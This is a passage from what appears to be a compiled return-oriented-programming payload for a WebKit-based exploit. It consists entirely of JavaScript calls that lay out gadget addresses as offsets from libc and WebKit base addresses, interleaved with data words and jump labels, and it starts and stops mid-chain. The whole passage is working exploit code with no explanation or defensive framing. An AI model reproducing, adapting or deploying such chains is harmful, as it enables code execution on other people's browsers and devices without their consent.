db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1627:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+127472, //L1628
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1628:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1629:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+127576, //L1631
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+127592, //L1632
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1631:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1632:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+127736, //L1636
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+127704, //L1634
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+127720, //L1635
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1634:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1635:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1636:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+127808, //L1638
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1638:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+127864, //L1639
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1639:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+127944, //L1643
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1643:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1641:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1642:
db([37, 0]); // 0x25
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+128048, //L1644
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+128064, //L1645
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1644:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1645:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+128152, //L1647
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1647:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+128208, //L1648
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1648:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+128280, //L1651
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1651:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+128336, //L1653
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1653:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1654:
libc_base+785097, //mov rsp, rbp ; pop rbp
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+128472, //L1655
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1655:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1656:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+128576, //L1658
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+128592, //L1659
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1658:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1659:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+128736, //L1663
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+128704, //L1661
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+128720, //L1662
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1661:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1662:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1663:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+128808, //L1665
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1665:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+128864, //L1666
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1666:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+128944, //L1670
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1670:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1668:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1669:
db([38, 0]); // 0x26
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+129048, //L1671
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+129064, //L1672
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1671:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1672:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+129152, //L1674
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1674:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+129208, //L1675
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1675:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129280, //L1678
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1678:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+129336, //L1680
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1680:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129464, //L1682
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+129448, //L1681
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1681:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1682:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129560, //L1683
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+129576, //L1684
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1683:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1684:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129688, //L1685
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+129672, //L1686
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1686:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1685:
db([0, 0]); // 0x0
//___sputc:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129760, //L1687
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L1687:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+129896, //L1691
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+129848, //L1692
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1692:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1689:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1690:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L1691:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+129992, //L1694
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+129976, //L1693
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1693:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1694:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+130072, //L1695
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1695:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1696:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+130176, //L1698
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130192, //L1699
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1698:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1699:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+130328, //L1703
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+130344, //L1704
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+130296, //L1701
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1701:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1702:
db([12, 0]); // 0xc
set_gadget(libc_base+792472,); //pop rcx
//L1703:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1704:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+130432, //L1705
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130448, //L1706
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1705:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1706:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+130600, //L1708
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+130632, //L1711
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130616, //L1709
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+130584, //L1710
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1710:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1708:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1709:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1711:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+130744, //L1714
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+130712, //L1712
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1712:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1713:
db([4294967295, 4294967295]); // -0x1
set_gadget(libc_base+788575,); //pop rax
//L1714:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+130832, //L1715
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1715:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1716:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+130936, //L1718
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130952, //L1719
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1718:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1719:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+131056, //L1722
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+131040, //L1721
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L1721:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1722:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+131112, //L1724
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1724:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1725:
db([12, 0]); // 0xc
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+131288, //L1727
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131304, //L1729
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+131272, //L1728
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1728:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1727:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1729:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+131424, //L1731
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131440, //L1732
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+131408, //L1730
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1730:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1731:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1732:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+131608, //L1733
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131624, //L1735
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+131592, //L1734
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1734:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1733:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1735:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+131728, //L1739
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131792, //L1741
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+131744, //L1737
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1739:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1737:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1738:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1740:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L1741:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+131912, //L1742+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+131904, //L1742
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L1742:
db([0, 0]); // 0x0
set_gadgets([
ropchain+131928, //L1742+24
ropchain+136048, //L1736
libc_base+793877, //pop rsi
ropchain+131968, //L1743
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1743:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1744:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+132072, //L1746
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132088, //L1747
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1746:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1747:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+132224, //L1751
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+132240, //L1752
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+132192, //L1749
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1749:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1750:
db([36, 0]); // 0x24
set_gadget(libc_base+792472,); //pop rcx
//L1751:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1752:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+132328, //L1753
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132344, //L1754
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1753:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1754:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+132496, //L1756
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+132528, //L1759
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132512, //L1757
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+132480, //L1758
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1758:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1756:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1757:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1759:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+132600, //L1760
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+132616, //L1761
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1760:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1761:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+132712, //L1763
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+132696, //L1762
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1762:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1763:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+132792, //L1764
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1764:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1765:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+132896, //L1767
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132912, //L1768
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1767:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1768:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+133048, //L1772
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133064, //L1773
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+133016, //L1770
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1770:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1771:
db([12, 0]); // 0xc
set_gadget(libc_base+792472,); //pop rcx
//L1772:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1773:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+133152, //L1774
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+133168, //L1775
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1774:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1775:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+133320, //L1777
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133352, //L1780
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+133336, //L1778
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+133304, //L1779
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1779:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1777:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1778:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1780:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+133424, //L1781
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133440, //L1782
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1781:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1782:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+133560, //L1784
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133576, //L1785
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+133544, //L1783
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1783:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1784:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1785:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
